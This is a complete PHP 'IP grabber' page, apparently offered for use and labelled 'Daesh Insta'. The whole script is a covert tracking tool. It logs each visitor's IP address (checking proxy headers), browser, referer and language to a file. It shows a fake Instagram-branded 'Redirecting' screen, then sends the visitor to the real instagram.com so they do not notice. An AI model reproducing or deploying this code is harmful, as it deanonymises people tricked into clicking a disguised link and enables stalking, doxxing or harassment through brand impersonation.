<?php
// 🔥 Daesh Insta IP Grabber - Created by Taym Allah 🔥
// 📍 Advanced Instagram tracking logger
header('Content-Type: text/html; charset=utf-8');
header('X-Content-Type-Options: nosniff');

function getIP() {
    $ipkeys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
                    'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED',
                    'HTTP_X_REAL_IP', 'REMOTE_ADDR');
    foreach ($ipkeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

$ip = getIP();
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s T');

$log_entry = sprintf(
    "[%s] IP:%s | UA:%s | REF:%s | LANG:%s\n",
    $timestamp, $ip, substr($useragent, 0, 50), $referer, $lang
);

file_put_contents('visitors.log', $log_entry, FILE_APPEND | LOCK_EX);

?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta http-equiv="refresh" content="2;url=https://www.instagram.com">
    <style>
        body { 
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif; 
            background: linear-gradient(45deg,#f09433 0,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888);
            height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center;
        }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; }
        .logo { font-size: 48px; font-weight: bold; color: #262626; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <h2>🔄 Redirecting...</h2>
        <p>Daesh Insta - Almost there! <span id="countdown">2</span>s</p>
    </div>
    <script>
        let time = 2;
        setInterval(() => {
            time--;
            document.getElementById('countdown').textContent = time;
            if (time <= 0) window.location = 'https://www.instagram.com';
        }, 1000);
    </script>
</body>
</html>
